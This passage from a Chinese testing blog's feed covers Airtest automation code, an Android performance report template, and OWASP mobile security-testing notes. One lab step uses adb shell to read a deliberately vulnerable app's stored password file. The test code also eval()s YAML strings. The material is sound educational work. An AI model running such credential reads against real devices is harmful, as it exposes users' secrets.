<h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p><img src="/aposts/5a751e2b/image-20220121115858698.png" alt="image-20220121115858698"></p>
<ul>
<li>测试结果的列表页面，优化了下页面</li>
</ul>
<p><img src="/aposts/5a751e2b/image-20220124111600060.png" alt="image-20220124111600060"></p>
<p><img src="/aposts/5a751e2b/image-20220121120048939.png" alt="image-20220121120048939"></p>
<h3 id="关键字驱动"><a href="#关键字驱动" class="headerlink" title="关键字驱动"></a>关键字驱动</h3><ul>
<li>airtest中也能实现关键字驱动？当然也可以</li>
<li>用例调用逻辑</li>
</ul>
<p><img src="/aposts/5a751e2b/image-20220124112127781.png" alt="image-20220124112127781"></p>
<ul>
<li>yml中的用例格式</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">poco(text=&quot;取消&quot;).click()</span> <span class="string">if</span> <span class="string">poco(text=&quot;取消&quot;).exists()</span> <span class="string">else</span> <span class="string">print(&quot;&quot;)</span></span><br><span class="line"><span class="comment"># 点击我的关注</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">poco(&quot;com.jianshu.haruki:id/tv_guanzhu&quot;).click()</span></span><br><span class="line"><span class="comment"># 点击动态下最近更新的作者第一条数据</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">poco(&quot;com.jianshu.haruki:id/userIcon&quot;).click()</span></span><br></pre></td></tr></table></figure>

<ul>
<li>解析yml中的用例，知道此逻辑后，可以定义任意关键字</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate_test_case</span>(<span class="params">poco, yml</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    读取yml用例文件,执行用例</span></span><br><span class="line"><span class="string">    :param poco:</span></span><br><span class="line"><span class="string">    :param yml:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    handing_error(poco)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(yml, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        d = yaml.safe_load(f)</span><br><span class="line">    <span class="comment"># 启动应用后的容错</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">        <span class="comment"># 寻找关键字click</span></span><br><span class="line">        event_click = i.split(<span class="string">&quot;.click()&quot;</span>)</span><br><span class="line">        <span class="comment"># 寻找关键字if</span></span><br><span class="line">        event_if = i.split(<span class="string">&quot;if&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;元素为：%s&quot;</span> % i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;操作元素开始时间：%s&quot;</span> % datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>))</span><br><span class="line">        <span class="comment"># 非if语句的click事件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(event_click) &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(event_if) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 利用eval把字符串转换为函数,每次点击之前智能等待</span></span><br><span class="line">            <span class="built_in">eval</span>(event_click[<span class="number">0</span>] + <span class="string">&quot;.wait_for_appearance(5)&quot;</span>)</span><br><span class="line">            <span class="comment"># 执行用例</span></span><br><span class="line">            <span class="built_in">eval</span>(i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 其他的poco事件</span></span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">eval</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;操作元素结束时间：%s&quot;</span> % datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 操作元素后的容错</span></span><br><span class="line">        handing_error(poco)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果有写逻辑比较复杂，不适合写到yml中，可以混合使用，比如下面这样写用例：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    poco = AndroidUiautomationPoco(use_airtest_input=<span class="literal">True</span>, screenshot_each_action=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化用例</span></span><br><span class="line">        init_app()</span><br><span class="line">        poco(text=<span class="string">&quot;取消&quot;</span>).click() <span class="keyword">if</span> poco(text=<span class="string">&quot;取消&quot;</span>).exists() <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        case_path = os.path.join(path, <span class="string">&quot;yml&quot;</span>, <span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">        operate_test_case(poco, case_path)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 点击我的</span></span><br><span class="line">        poco(<span class="string">&quot;com.jianshu.haruki:id/tv_more_menu&quot;</span>).wait(<span class="number">5</span>).click()</span><br><span class="line">        <span class="comment"># 点击我的文章</span></span><br><span class="line">        poco(text=<span class="string">&quot;我的文章&quot;</span>).wait(<span class="number">5</span>).click()</span><br><span class="line">        <span class="comment"># 向上滑动</span></span><br><span class="line">        poco(<span class="string">&quot;com.jianshu.haruki:id/refresh_view&quot;</span>).focus([<span class="number">0.5</span>, <span class="number">0.5</span>]).swipe([<span class="number">0.5</span>, -<span class="number">0.5</span>])</span><br><span class="line">        </span><br><span class="line">        case_path = os.path.join(path, <span class="string">&quot;yml&quot;</span>, <span class="string">&quot;oooo&quot;</span>)</span><br><span class="line">        operate_test_case(poco, case_path)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        snapshot(msg=<span class="string">&quot;报错后截图&quot;</span>)</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure>

<h2 id="多机web"><a href="#多机web" class="headerlink" title="多机web"></a>多机web</h2><ul>
<li>代码逻辑几乎一样，只是把Namespace方法中的devicec传为None</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">if</span> device == <span class="string">&quot;web&quot;</span>:</span><br><span class="line">       air_device = <span class="literal">None</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       air_device = [dev_connect + device] </span><br><span class="line">...</span><br><span class="line">   args = Namespace(device=air_device, log=log, compress=<span class="literal">None</span>, recording=recording, script=script, no_image=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>配置文件略有不同</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># setting1.yaml</span><br><span class="line">[default]</span><br><span class="line"># 手机名字</span><br><span class="line">phone=谷歌浏览器</span><br><span class="line"></span><br><span class="line"># android|ios|web，当填如web时，需要填写驱动文件位置</span><br><span class="line">platform =web</span><br><span class="line">driver_path=E:\proj\airtest_auto\util\chromedriver.exe</span><br><span class="line"></span><br><span class="line">[multi]</span><br><span class="line"># 如果是web测试，dev一定要填web</span><br><span class="line">test_case = [&#123;&quot;dev&quot;:&quot;web&quot;,&quot;test_module&quot;: [&quot;home&quot;],&quot;phone&quot;:&quot;谷歌浏览器1&quot;&#125;, &#123;&quot;dev&quot;:&quot;web&quot;,&quot;test_module&quot;:[&quot;home2&quot;],&quot;phone&quot;:&quot;谷歌浏览器2&quot;&#125;]</span><br></pre></td></tr></table></figure>

<ul>
<li>用例编写</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding=utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> airtest.core.api <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># pip3 install pynput</span></span><br><span class="line"><span class="comment"># pip3 install airtest-selenium</span></span><br><span class="line"><span class="comment"># 得到绝对路径</span></span><br><span class="line"></span><br><span class="line">abs_path = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"><span class="comment"># 得到公共用例目录</span></span><br><span class="line">common_path = os.path.join(abs_path.split(<span class="string">&quot;airtest_auto&quot;</span>)[<span class="number">0</span>], <span class="string">&quot;airtest_auto&quot;</span>, <span class="string">&quot;web_util&quot;</span>)</span><br><span class="line">sys.path.append(common_path)</span><br><span class="line"><span class="keyword">from</span> web_util <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">driver = get_driver()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line">    driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    driver.find_element_by_id(<span class="string">&quot;su&quot;</span>).click()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    snapshot(msg=<span class="string">&quot;报错后截图&quot;</span>)</span><br><span class="line">    <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    driver.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>测试结果</li>
</ul>
<p><img src="/aposts/5a751e2b/image-20220124173817575.png" alt="image-20220124173817575"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>还有一种最优方案是，后台有个监控任务，不停的读取用例队列，每台手机运行20条用例（可设置）多台并行，手机(设备)不够就等待，手机有空闲后，分配用例队列中的用例，直到用例全部分配完毕。</li>
</ul>
]]></content>
      <categories>
        <category>自动化测试</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>自动化测试</tag>
        <tag>aritest</tag>
      </tags>
  </entry>
  <entry>
    <title>android性能测试报告</title>
    <url>/aposts/816c9569/</url>
    <content><![CDATA[<h1 id="Android专项测试"><a href="#Android专项测试" class="headerlink" title="Android专项测试"></a>Android专项测试</h1><ul>
<li>项目名：</li>
<li>测试人：</li>
<li>测试机型：华为 P6 ,全网通, 64+4 ,4核cpu</li>
<li>总分：23</li>
</ul>
<h2 id="详细报告"><a href="#详细报告" class="headerlink" title="详细报告"></a>详细报告</h2><h3 id="首次启动（冷启动）"><a href="#首次启动（冷启动）" class="headerlink" title="首次启动（冷启动）"></a>首次启动（冷启动）</h3><ul>
<li>优先级：P0</li>
<li>预期结果：3秒内启动</li>
<li>测试手段(任选一种测试方法)<ul>
<li>logcat监控ActivityManange</li>
<li>adb shell am start -v</li>
<li>人工秒表计数</li>
</ul>
</li>
<li>实际结果：4秒启动</li>
<li>实际得分：2分</li>
</ul>
<blockquote>
<p>优先级：一般从大到小分为P0,P1,P2</p>
<p>得分：满分3分，满足预期结果90%的2分，满足预期结果85%得1分，低于预期结果85%得0分</p>
</blockquote>
<h3 id="非第一次启动（热启动）"><a href="#非第一次启动（热启动）" class="headerlink" title="非第一次启动（热启动）"></a>非第一次启动（热启动）</h3><ul>
<li>优先级：P0</li>
<li>预期结果：2秒内启动</li>
<li>测试手段：应用运行到后台，采用冷启动的侧测试方法</li>
</ul>
<h3 id="内存测试"><a href="#内存测试" class="headerlink" title="内存测试"></a>内存测试</h3><ul>
<li>优先级：P0</li>
<li>预期结果：无明细内存泄漏</li>
<li>测试手段（任选其中之一）：<ul>
<li>在核心页面或图片较多页面用android sdk中的Monitor观察</li>
<li>monkey随机事件,adb shell dumpsys meninfo监控内存每秒情况</li>
</ul>
</li>
<li>实际结果：轮播图发现占用内存逐渐增大，偶先闪退</li>
<li>实际得分：0</li>
</ul>
<h3 id="CPU测试"><a href="#CPU测试" class="headerlink" title="CPU测试"></a>CPU测试</h3><ul>
<li><p>优先级：P1</p>
</li>
<li><p>预期结果：cpu占用不出现长期过高，或者极大波动</p>
</li>
<li><p>测试手段（任选其中之一）：</p>
<ul>
<li>在核心界面，adb shell 后，用top监控 </li>
<li>monkey命令后，用adb shell dumpsys cpuinfo</li>
</ul>
</li>
<li><p>实际结果：cpu正常工作</p>
</li>
<li><p>实际得分：3</p>
</li>
</ul>
<h3 id="耗电量测试"><a href="#耗电量测试" class="headerlink" title="耗电量测试"></a>耗电量测试</h3><ul>
<li>优先级：P2</li>
<li>预期结果：<ul>
<li>装目标APP,待机功耗无明细差别 </li>
<li>进入待机，电流在正常范围 </li>
<li>长时间使用应用耗电量正常（和竞品对比）</li>
</ul>
</li>
<li>测试手段（任选其一）：<ul>
<li>采用市场上第三方工具，如金山电池、 <strong>Battery Historian</strong></li>
<li>基于<code>PowerManager.wakeLock</code>进行自研 </li>
<li>更准确的测试：功耗计算&#x3D;CPU消耗+WakeLock消耗+数据传输消耗+GPS消耗+WiFi连接消耗</li>
<li><code>db shell dumpsys battery reset</code>和<code>adb shell dumpsys batterystats --enable full-wake-history </code>清空耗电结合自带手机管家（可以看耗电详情），也可以使用<code>db shell dumpsys batterystats com.wawj.app.t | more &gt; C:\Users\del\Desktop\a.txt</code>收集目标应用耗电量</li>
</ul>
</li>
</ul>
<h3 id="流量使用情况"><a href="#流量使用情况" class="headerlink" title="流量使用情况"></a>流量使用情况</h3><ul>
<li><p>优先级：P2</p>
</li>
<li><p>预期结果：流量上传下载不出现消耗过大</p>
</li>
<li><p>测试手段(任选一种测试方法)</p>
<ul>
<li>第三方工具，如流量宝</li>
<li>抓包工具：tcpdmp</li>
<li>adb获取</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell cat /proc/&quot; + pid + &quot;/net/dev</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="UI性能测试"><a href="#UI性能测试" class="headerlink" title="UI性能测试"></a>UI性能测试</h3><ul>
<li>优先级：P1</li>
</ul>
<h4 id="显示GPU过渡绘制"><a href="#显示GPU过渡绘制" class="headerlink" title="显示GPU过渡绘制"></a>显示GPU过渡绘制</h4><ul>
<li>预期结果：绘制颜色不能出现大量的红色</li>
<li>测试手段：<ul>
<li>打卡开发者GPU渲染，绘制的颜色标识从好到差为蓝色、浅绿色、淡红色、红色</li>
</ul>
</li>
</ul>
<h4 id="fps测试"><a href="#fps测试" class="headerlink" title="fps测试"></a>fps测试</h4><ul>
<li><p>预期结果：一秒60帧，计算下来大概16.7ms一帧</p>
</li>
<li><p>测试手段：</p>
<ul>
<li>在开发者模式下，点击“GPU更显模式分析”→勾选上“dab shell dumpsys gfxinfo” ，然后执行<code>adb shell dumpsys gfxinfo 包名&gt;fps.txt</code> 用excel统计</li>
</ul>
</li>
</ul>
<h3 id="图片压缩"><a href="#图片压缩" class="headerlink" title="图片压缩"></a>图片压缩</h3><ul>
<li>优先级：P2</li>
<li>预期结果：不能太大，需要压缩</li>
<li>测试手段：抓包</li>
</ul>
<h3 id="缓存测试"><a href="#缓存测试" class="headerlink" title="缓存测试"></a>缓存测试</h3><ul>
<li>优先级：P2</li>
<li>预期结果：图片和公用分类的缓存机制</li>
<li>测试手段：<ul>
<li>第一次和第二次查看列表图片的抓包对比</li>
<li>第一次和第二次城市列表的分类抓包对比</li>
</ul>
</li>
<li>实际结果</li>
<li>实际得分</li>
</ul>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul>
<li>excel图片展示报告</li>
</ul>
<p><img src="/aposts/816c9569/2231755-e771ee8ffc125994.png"></p>
<ul>
<li><a href="/aposts/af1b4933">python+monkey压力测试</a></li>
</ul>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>android性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>app安全测试-M3-M10</title>
    <url>/aposts/453281b/</url>
    <content><![CDATA[<h2 id="M3-不安全的通信"><a href="#M3-不安全的通信" class="headerlink" title="M3-不安全的通信"></a>M3-不安全的通信</h2><ul>
<li>直接参考挂<a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">官网</a></li>
</ul>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><ul>
<li>最简单的一种就是拦截app请求，然后对接口进行篡改</li>
<li>没有进行实际的实践，把一些不错的文章记录下</li>
<li><a href="https://code.tutsplus.com/tutorials/securing-communications-on-android--cms-31596">这文章</a>有一些详细的实践说明，可以参考下，我大概总结如何避免：</li>
</ul>
<h4 id="使用https"><a href="#使用https" class="headerlink" title="使用https"></a>使用https</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL url = new URL(&quot;https://example.com&quot;);</span><br><span class="line">HttpsURLConnection httpsURLConnection = (HttpsURLConnection)url.openConnection();</span><br><span class="line">httpsURLConnection.connect();</span><br></pre></td></tr></table></figure>

<h4 id="更新加密包"><a href="#更新加密包" class="headerlink" title="更新加密包"></a>更新加密包</h4><ul>
<li>一些敏感重要的东西，在使用第三方提供的加密服务时，需要时常关注是否有漏洞，以及版本信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">implementation &#x27;com.google.android.gms:play-services-safetynet:15.0.1&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="证书和公钥的锁定"><a href="#证书和公钥的锁定" class="headerlink" title="证书和公钥的锁定"></a>证书和公钥的锁定</h4><h5 id="如何CertificatePinning"><a href="#如何CertificatePinning" class="headerlink" title="如何CertificatePinning"></a>如何CertificatePinning</h5><ul>
<li><p>1.首先服务器端使用RSA算法生成一对公钥私钥对，服务器端持有私钥，线下将公钥传给客户端。App中将这个值硬编码到本地。</p>
</li>
<li><p>2.App端可以自己实现一个X509TrustManager接口,在其中的CheckServerTrusted()方法里通过证书链拿到PublicKey,</p>
</li>
<li><p>3.比较1和2中进行md5的值，如果匹配则服务器验证通过，否则立即终止与此服务器的通信</p>
</li>
</ul>
<p>更多介绍来自<a href="https://blog.csdn.net/ptwh0608/article/details/44155255?winzoom=1">这里</a></p>
<h4 id="异常过滤和验证"><a href="#异常过滤和验证" class="headerlink" title="异常过滤和验证"></a>异常过滤和验证</h4><p>就是常见的一些异常验证和过滤，比如正则、特殊字符过滤等，下面就是典型的异常验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (editText.getText().toString().length() &lt;= 48)</span><br><span class="line">&#123;</span><br><span class="line">    ; //return something...</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    ; //return default or error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="和其他App通信"><a href="#和其他App通信" class="headerlink" title="和其他App通信"></a>和其他App通信</h4><p>和其他app通信时，有些情况下，开发人员留下了共享文件或实现了套接字来交换敏感信息，建议使用<code>Intents</code></p>
<h4 id="端到端加密"><a href="#端到端加密" class="headerlink" title="端到端加密"></a>端到端加密</h4><p>一个很好的例子是一个加密聊天应用程序，其中两个移动设备通过服务器相互通信；只有发送者和接收者才能阅读对方的信息。</p>
<h2 id="M4-不安全的身份验证"><a href="#M4-不安全的身份验证" class="headerlink" title="M4-不安全的身份验证"></a>M4-不安全的身份验证</h2><ul>
<li><p>糟糕的身份验证方案允许攻击者在移动应用或该应用使用的服务器上匿名执行任何用户操作。由于移动设备的输入形式因素，弱应用认证是一个非常常见的问题</p>
</li>
<li><p>app在和服务器通信时，可以拦截请求，对这些请求进行参数篡改，这里就懒得验证了，有兴趣的可以自行操作</p>
</li>
</ul>
<p><img src="/aposts/453281b/image-20220402112740084.png" alt="image-20220402112740084"></p>
<h2 id="M5-弱加密"><a href="#M5-弱加密" class="headerlink" title="M5-弱加密"></a>M5-弱加密</h2><p>加密容易被破解</p>
<ul>
<li>常见类型：<ul>
<li>内置代码加密</li>
<li>硬编码密钥</li>
<li>不安全或过时的算法（<code>RC2/MD4/MD5/SHA1</code>）</li>
</ul>
</li>
</ul>
<p><img src="/aposts/453281b/image-20220402112345282.png" alt="image-20220402112345282"></p>
<p><img src="/aposts/453281b/image-20220402112406242.png" alt="image-20220402112406242"></p>
<p><img src="/aposts/453281b/image-20220402112431474.png" alt="image-20220402112431474"></p>
<h2 id="M6-不安全的授权"><a href="#M6-不安全的授权" class="headerlink" title="M6 - 不安全的授权"></a>M6 - 不安全的授权</h2><p><code>M4-不安全的身份验证</code>风险通常与M6混淆，因为两者都与用户凭据有关。M6是关于使用授权以合法用户身份登录。M4是攻击者试图以匿名用户身份登录以绕过身份验证过程的情况，通常由如下问题：</p>
<ol>
<li>不安全的应用程序权限设置</li>
<li>冗余授予的权限</li>
<li>存在不安全的直接对象引用（IDOR）漏洞</li>
</ol>
<h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><ul>
<li><p>来自<a href="https://blog.csdn.net/m0_37268841/article/details/104728551">这里</a></p>
</li>
<li><p>使用的<code>Android Killer</code>，因为这个工具会把权限这块明显的列出来</p>
</li>
</ul>
<p><img src="/aposts/453281b/image-20220402113516303.png" alt="image-20220402113516303"></p>
<ul>
<li>上面标色的权限部分，根据业务需要分别check一下，看一下是不是真的是必须的。</li>
<li>冗余授权也可以在这边找到，但也可以用另外一个工具<code>drozer</code>查看</li>
</ul>
<p><img src="/aposts/453281b/image-20220402155014773.png" alt="image-20220402155014773"></p>
<ul>
<li>抓包</li>
</ul>
<h2 id="M7-客户端代码质量"><a href="#M7-客户端代码质量" class="headerlink" title="M7-客户端代码质量"></a>M7-客户端代码质量</h2><ul>
<li><p>M7的风险源于糟糕或不一致的编码实践，即开发团队的每个成员都遵循不同的编码实践，并在最终代码中造成不一致。</p>
</li>
<li><p>M7对应用程序安全没有威胁。尽管患病率很高，但这一风险区域很难发现。对于黑客来说，了解糟糕编码的模式并不容易。这个过程通常需要复杂的人工分析。</p>
</li>
<li><p>在获得源码情况下，可以参考这里的<a href="https://f-sec.blog.csdn.net/article/details/104740837">测试方法</a></p>
</li>
</ul>
<h2 id="M8-代码篡改"><a href="#M8-代码篡改" class="headerlink" title="M8 -代码篡改"></a>M8 -代码篡改</h2><p>测试点：</p>
<ol>
<li>修改代码</li>
<li>修改资源</li>
<li>修改API</li>
</ol>
<p>具体测试方法参考<a href="https://f-sec.blog.csdn.net/article/details/104740837">这里</a></p>
<h2 id="M10-无关功能"><a href="#M10-无关功能" class="headerlink" title="M10-无关功能"></a>M10-无关功能</h2><p>测试点：</p>
<ul>
<li>开发人员包括隐藏的后门功能或其他不打算发布到生产环境中的内部开发安全控件</li>
<li>URL 修改</li>
<li>应用程序可以在被 root 或越狱手机中使用 </li>
<li>Back-and-Refresh 攻击</li>
<li>应用程序中包含过时的文件</li>
<li>没有显示最近登录信息</li>
<li>到期后或释放的资源操作</li>
<li>ASLR没有被使用</li>
<li>剪切板未禁用</li>
<li>缓存粉碎未激活</li>
<li>Android备份检查</li>
<li>未实行可信任发布</li>
<li>允许所有 Hostname Verifier</li>
<li>弱自定义 Hostname Verifier</li>
</ul>
<p>测试方法来源<a href="https://f-sec.blog.csdn.net/article/details/104742476">这里</a></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>安全测试思维导图</li>
</ul>
<p><img src="/aposts/453281b/1533540920557546-16492305970471.png" alt="1533540920557546"></p>
<ul>
<li><a href="https://blog.51cto.com/laoyinga/2155341">移动APP安全测试</a></li>
</ul>
]]></content>
      <categories>
        <category>app安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>app安全测试</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>app安全测试-平台和数据存储不当使用</title>
    <url>/aposts/fcb52a56/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>接着上篇文章<a href="/aposts/ed775b3f/">app安全测试-逆向工程</a>继续学习</li>
<li>可以查看<a href="https://owasp.org/www-project-mobile-top-10/">官网top10</a>的说明</li>
</ul>
<h2 id="M1-平台使用不当"><a href="#M1-平台使用不当" class="headerlink" title="M1-平台使用不当"></a>M1-平台使用不当</h2><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><h4 id="糟糕的Web服务强化"><a href="#糟糕的Web服务强化" class="headerlink" title="糟糕的Web服务强化"></a>糟糕的Web服务强化</h4><ul>
<li>逻辑缺陷</li>
<li>弱认证</li>
<li>弱会话管理或没有会话管理</li>
<li>会话固定</li>
<li>使用GET方法传输的敏感数据</li>
</ul>
<h4 id="不安全的Web服务器配置"><a href="#不安全的Web服务器配置" class="headerlink" title="不安全的Web服务器配置"></a>不安全的Web服务器配置</h4><ul>
<li>默认内容</li>
<li>管理界面</li>
<li>Web服务和支持移动的网站上的注入（SQL，XSS，Command）</li>
<li>身份验证缺陷</li>
<li>会话管理缺陷</li>
<li>访问控制漏洞</li>
<li>本地和远程文件包括</li>
</ul>
<h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><ul>
<li>开发写代码的调试信息中，经常可能会有一些敏感的信息被打印出来，比如用<code>jd-gui</code>查看下如下内容：</li>
</ul>
<p><img src="/aposts/fcb52a56/image-20220401111712771.png" alt="image-20220401111712771"></p>
<ul>
<li>既然是查看日志，完成可以采用直接如<code>IDE+监控LogCat</code>的方式</li>
</ul>
<p><img src="/aposts/fcb52a56/image-20220401112145099.png" alt="image-20220401112145099"></p>
<ul>
<li>还有一种方式，其实就是<code>adb logcat</code> 过滤日志的方式，也是可行的</li>
</ul>
<h2 id="M2-不安全的数据存储"><a href="#M2-不安全的数据存储" class="headerlink" title="M2-不安全的数据存储"></a>M2-不安全的数据存储</h2><p>敏感数据未加密存储、本地文件未加密、WebView本地明文存储cookie等问题</p>
<h3 id="常见类型-1"><a href="#常见类型-1" class="headerlink" title="常见类型"></a>常见类型</h3><ul>
<li>SQL数据库</li>
<li>日志文件</li>
<li>XML数据存储或清单文件</li>
<li>二进制数据存储</li>
<li>Cookie</li>
<li>敏感数据存储到SD卡</li>
<li>SD卡上的数据可以被任意应用读取</li>
<li>云同步</li>
</ul>
<h3 id="避免方式"><a href="#避免方式" class="headerlink" title="避免方式"></a>避免方式</h3><ul>
<li>URL缓存（请求和响应）</li>
<li>键盘按键缓存</li>
<li>复制&#x2F;粘贴缓冲区缓存</li>
<li>应用背景</li>
<li>中间数据</li>
<li>记录</li>
<li>HTML5数据存储</li>
<li>浏览器cookie对象</li>
<li>析数据发送给第三方</li>
</ul>
<h3 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h3><ul>
<li>下载<a href="http://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz">diva apk</a> 解压后把apk文件安装到<strong>雷电模拟器上</strong></li>
<li>用模拟器打开apk</li>
</ul>
<p><img src="/aposts/fcb52a56/image-20220401160746121.png" alt="image-20220401160746121"></p>
<p><img src="/aposts/fcb52a56/image-20220401155946405.png" alt="image-20220401155946405"></p>
<ul>
<li>用<code>jd-gui</code> 打开代码分析，发现使用了<code>sharepreference</code> 存信息到本地</li>
</ul>
<p><img src="/aposts/fcb52a56/image-20220401160501447.png" alt="image-20220401160501447"></p>
<ul>
<li>用<code>adb</code> 进入到<code>shell</code>，找到<code>shared_prefs</code>，最终使用<code>cat  jakhar.aseem.diva_preferences.xml</code> 查看到敏感的信息内容</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">cd /data/data/jakhar.aseem.diva</span><br><span class="line"></span><br><span class="line">osp:/data/data/jakhar.aseem.diva # ls</span><br><span class="line">cache  code_cache  databases  lib  shared_prefs</span><br><span class="line">osp:/data/data/jakhar.aseem.diva # cd shared_prefs</span><br><span class="line">aosp:/data/data/jakhar.aseem.diva/shared_prefs # ls</span><br><span class="line">jakhar.aseem.diva_preferences.xml</span><br><span class="line">osp:/data/data/jakhar.aseem.diva # cat  jakhar.aseem.diva_preferences.xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span><br><span class="line">&lt;map&gt;</span><br><span class="line">    &lt;string name=&quot;user&quot;&gt;hello&lt;/string&gt;</span><br><span class="line">    &lt;string name=&quot;password&quot;&gt;word&lt;/string&gt;</span><br><span class="line">&lt;/map&gt;</span><br><span class="line">at jakhar.aseem.diva_preferences.xml                                          &lt;</span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span><br><span class="line">&lt;map&gt;</span><br><span class="line">    &lt;string name=&quot;user&quot;&gt;hello&lt;/string&gt;</span><br><span class="line">    &lt;string name=&quot;password&quot;&gt;word&lt;/string&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>app安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>app安全测试</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>app安全测试-逆向工程</title>
    <url>/aposts/ed775b3f/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><p>了解移动平台上的漏洞，因为越来越多的用户正在使用个人智能手机，而这类设备操作复杂，我们可能无法理解其背后的漏洞。今天的课程将以<code>OWASP TOP 10</code>(web也有对应的<code>top 10</code>)提供的十大移动漏洞为指导。</p>
</li>
<li><p>阅读<a href="https://u-tor.com/topic/android-app-security-testing-how-to-check-your-application">这个网站</a>，里面对这个top 10 都有介绍</p>
</li>
</ul>
<p><code>OWASP Mobile Top 10</code> ：</p>
<ul>
<li>M1 - 平台使用不当</li>
